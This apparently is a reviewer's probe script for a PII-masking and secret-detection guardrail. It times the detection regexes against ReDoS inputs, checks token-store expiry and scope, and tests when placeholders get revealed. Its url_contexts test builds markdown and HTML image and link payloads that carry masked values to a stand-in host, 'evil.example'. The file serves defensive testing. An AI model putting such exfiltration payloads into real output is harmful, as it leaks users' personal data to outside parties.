"""Reviewer probe for 08-tam-1a r2 (6d0d9ba), run inside the review08t1a backend container.

docker exec -w /app -e PYTHONPATH=/app review08t1a-backend-1 python /tmp/probe08r2.py
Values are synthetic (example.test addresses); nothing secret is printed.
"""

import asyncio
import random
import re
import time
import uuid

from ffcore.core.config import get_settings
from ffcore.guardrails import masking, rules
from ffcore.runtime.events import redis_client

OLD_SHORT = re.compile(
    r"(?i)\b(?P<word>" + rules._CREDENTIAL_WORD + r")\b[\"']?\s*(?:[:=]|\bis\b)?\s*[\"']?"
    r"(?:(?:bearer|basic)\s+)?"
    r"(?P<value>[A-Za-z0-9_\-+/=]{13,23})(?![A-Za-z0-9_\-+/=])"
)
OLD_ASSIGNMENT = re.compile(
    r"(?i)\b(?:password|passwd|pwd|şifre(?:m|si|niz)?|parola(?:m|sı)?)\b\s*(?:[:=]|is)?\s*"
    r"(?P<value>[^\s,;]{6,})"
)


def timed(label, text):
    t0 = time.perf_counter()
    rules.find_secrets(text)
    print(f"REDOS {label} ({len(text)} chars): {time.perf_counter() - t0:.3f} s")


def redos() -> None:
    for word in ("token", "password", "şifre", "API_KEY", "erişim anahtarı"):
        timed(f"{word}+20000sp", word + " " * 20000 + "!")
    timed("token+200000sp", "token" + " " * 200000 + "!")
    timed("password+200000sp", "password" + " " * 200000 + "!")
    timed("180k mixed token", ("token" + " " * 3000 + "x ") * 60)
    timed("180k mixed password", ("password" + " " * 3000 + "x ") * 60)
    timed("token+bearer spaces", "token" + " " * 20000 + "bearer" + " " * 20000 + "!")
    timed("token tabs/newlines", "token" + "\t\n " * 20000 + "!")
    timed("token is spaces", "token" + " is" * 20000 + "!")
    timed("quotes", "token" + "\"' " * 20000 + "!")
    timed("many words", "token " * 30000)


def equivalence() -> None:
    rng = random.Random(20261103)
    words = ["token", "TOKEN", "Token:", "api_key", "API-KEY", "client_secret", "password",
             "passwd", "pwd", "secret", "bearer", "Authorization", "şifre", "parola",
             "erişim anahtarı", "gizli anahtar", "tokenis", "xtoken"]
    seps = ["", " ", "  ", "\t", "\n", ":", ": ", " :", "=", " = ", "is", " is ", " is",
            '"', "'", '" ', ": Bearer ", " basic ", "::", "==", " isis "]
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-+/=,;"
    diff_short = diff_assign = 0
    for _ in range(20000):
        value = "".join(rng.choice(alphabet) for _ in range(rng.randint(3, 30)))
        text = (rng.choice(["", "x ", "(", "a"]) + rng.choice(words) + rng.choice(seps)
                + rng.choice(seps) + rng.choice(seps) + value + rng.choice(["", " end", ")", "\n"]))
        if [m.span("value") for m in rules._SHORT_TOKEN.finditer(text)] != [
            m.span("value") for m in OLD_SHORT.finditer(text)
        ]:
            diff_short += 1
            if diff_short <= 3:
                print("EQUIV short differs", repr(text))
        if [m.span("value") for m in rules._ASSIGNMENT.finditer(text)] != [
            m.span("value") for m in OLD_ASSIGNMENT.finditer(text)
        ]:
            diff_assign += 1
            if diff_assign <= 3:
                print("EQUIV assignment differs", repr(text))
    print(f"EQUIV 20000 samples: short diffs {diff_short}, assignment diffs {diff_assign}")


def fp_fn() -> None:
    for t in (
        # r1 MAJOR-5 negatives
        "token = getAccessToken() neden null?",
        "anahtar TeslimProjeleri kapsamında",
        "anahtar teslim projeleri kapsamındadır",
        "token: INC0012345678",
        "secret = loadSecretValue(x)",
        "Authorization: BearerTokenRequired",
        # still caught
        "API_KEY=Xk9QpLmZ2vRtWq",
        "Authorization: Bearer Xk9QpLmZ2vRtWq",
        "erişim anahtarı: Xk9QpLmZ2vRtWq",
        "gizli anahtar Xk9QpLmZ2vRtWq",
        "token: AbcDefGhiJklMno",
        "token: ABCDEF1234567",
        "token: Ab1Cd2Ef3Gh4Ij",
        # r1 false negatives (FOLLOWUP-162 per K-08T1-0009)
        "auth_token: QWERTYUIOPASDF",
        "DB_TOKEN=Xk9QpLmZ2vRt8",
        "anahtar: Xk9QpLmZ2vRt8",
        "anahtarı: Xk9QpLmZ2vRt8",
    ):
        hits = [(f.category, f.value) for f in rules.find_secrets(t)]
        print(f"SECRETS {t!r} -> {hits}")


async def ttl_and_scope() -> None:
    redis = redis_client(get_settings())
    tag = uuid.uuid4().hex[:8]
    a, b = f"probe-a-{tag}", f"probe-b-{tag}"
    store = masking.RedisTokenStore(redis, ttl_s=2)
    t_old = await store.token_for(a, "EMAIL|ali@example.test", "ali@example.test")
    answer = f"Kayıt sahibi {t_old}."
    print("TTL first token", t_old)
    await asyncio.sleep(3)
    print("TTL after expiry", await masking.detokenize(answer, store=store, scope=a))
    t_new = await store.token_for(a, "EMAIL|veli@example.test", "veli@example.test")
    print("TTL new token after expiry", t_new)
    print("TTL old answer now reads", await masking.detokenize(answer, store=store, scope=a))
    print("TTL counter key ttl s", await redis.ttl("ffcore:pii:n:" + a))
    # lookup renews the mapping
    c = f"probe-c-{tag}"
    t = await store.token_for(c, "EMAIL|can@example.test", "can@example.test")
    for _ in range(3):
        await asyncio.sleep(1.4)
        print("TTL lookup renews", await store.lookup(c, t))
    # Counter seeded from a pre-r2 mapping's `n` field
    d = f"probe-d-{tag}"
    await redis.hset("ffcore:pii:" + d, mapping={"n": 5, "k:X": "<<PII_5>>", "t:<<PII_5>>": "x"})
    print("SEED old n=5 -> next", await store.token_for(d, "EMAIL|y@example.test", "y@example.test"))
    # Scope: B reserves above A's carried number
    store = masking.RedisTokenStore(redis, ttl_s=60)
    ta = await store.token_for(a + "x", "EMAIL|ayse@example.test", "ayse@example.test")
    await store.reserve(b, 1)
    tb = await store.token_for(b, "EMAIL|fatma@example.test", "fatma@example.test")
    history = f"Önceki cevap: {ta}"
    print("SCOPE A token", ta, "B token after reserve(1)", tb)
    print("SCOPE A's stale history in B", await masking.detokenize(history, store=store, scope=b))
    # Huge carried numbers (a user can type any placeholder into the conversation)
    e = f"probe-e-{tag}"
    await store.reserve(e, 99999999)
    big = await store.token_for(e, "EMAIL|e@example.test", "e@example.test")
    print("BIG reserve 99999999 -> next", big)
    det = masking.StreamDetokenizer(store, e)
    text = f"Sonuç {big} tamam"
    out = "".join([await det.feed(text[i : i + 3]) for i in range(0, len(text), 3)])
    out += await det.flush()
    print("BIG 9-digit placeholder through the stream (3-char chunks) ->", repr(out))
    f_ = f"probe-f-{tag}"
    try:
        await store.reserve(f_, int("9" * 25))
        print("HUGE reserve(1e25-1) ok; next", await store.token_for(f_, "EMAIL|f@example.test", "f@example.test"))
    except Exception as exc:  # noqa: BLE001 - the probe reports what happens
        print("HUGE reserve/token_for error", type(exc).__name__, str(exc)[:80])
    for k in (a, a + "x", b, c, d, e, f_):
        await redis.delete("ffcore:pii:" + k, "ffcore:pii:n:" + k)


async def url_contexts() -> None:
    store = masking.MemoryTokenStore()
    tok = await store.token_for("s", "EMAIL|ali@example.test", "ali@example.test")
    cases = {
        "md image": f"![x](https://evil.example/?q={tok})",
        "md image space after (": f"![x]( https://evil.example/?q={tok})",
        "md image protocol-relative": f"![x](//evil.example/?q={tok})",
        "md image ( space //": f"![x]( //evil.example/?q={tok})",
        "md angle dest with space": f"![x](<https://evil.example/a b?q= {tok}>)",
        "md ref def https": f"![x][1]\n\n[1]: https://evil.example/?q={tok}",
        "md ref def protocol-relative": f"![x][1]\n\n[1]: //evil.example/?q={tok}",
        "md ref def angle space": f"![x][1]\n\n[1]: <//evil.example/a b?q= {tok}>",
        "html img src //": f"<img src=//evil.example/?q={tok}>",
        "html img src quoted space": f'<img src="https://evil.example/a b?q= {tok}">',
        "html href quoted space": f'<a href="https://evil.example/a b?q= {tok}">x</a>',
        "www autolink": f"www.evil.example/?q={tok}",
        "plain text": f"Kişi {tok} idi.",
    }
    for name, text in cases.items():
        out, unresolved, skipped = await masking.reveal_text(text, store=store, scope="s")
        print(f"URL {name}: {'REVEALED' if 'ali@example.test' in out else 'kept'} (skipped {skipped})")
    # Stream: a URL whose start lies more than URL_CONTEXT_MAX_CHARS before the placeholder
    for n in (100, 8000, 9000):
        head = "![x](https://evil.example/?a=" + "a" * n + "&q="
        whole = head + tok + ")"
        out_whole, _, _ = await masking.reveal_text(whole, store=store, scope="s")
        det = masking.StreamDetokenizer(store, "s")
        out = ""
        for i in range(0, len(whole), 50):
            out += await det.feed(whole[i : i + 50])
        out += await det.flush()
        cr = masking.ContextReveal(store, "s")
        live = ""
        for i in range(0, len(whole), 50):
            live += (await cr.data({"text": whole[i : i + 50]}, stream_text=True))["text"]
        print(
            f"URL long {n}: one piece {'REVEALED' if 'ali@' in out_whole else 'kept'}, "
            f"StreamDetokenizer {'REVEALED' if 'ali@' in out else 'kept'}, "
            f"ContextReveal live {'REVEALED' if 'ali@' in live else 'kept'}"
        )
    # JSON escape of a value with quotes/backslash
    t2 = await store.token_for("s", "PERSON|q", 'Ali "Kaya" \\ x')
    out, _, _ = await masking.reveal_text('{"name": "' + t2 + '"}', store=store, scope="s", json_escape=True)
    print("JSON escape", out)


if __name__ == "__main__":
    redos()
    equivalence()
    fp_fn()
    asyncio.run(ttl_and_scope())
    asyncio.run(url_contexts())
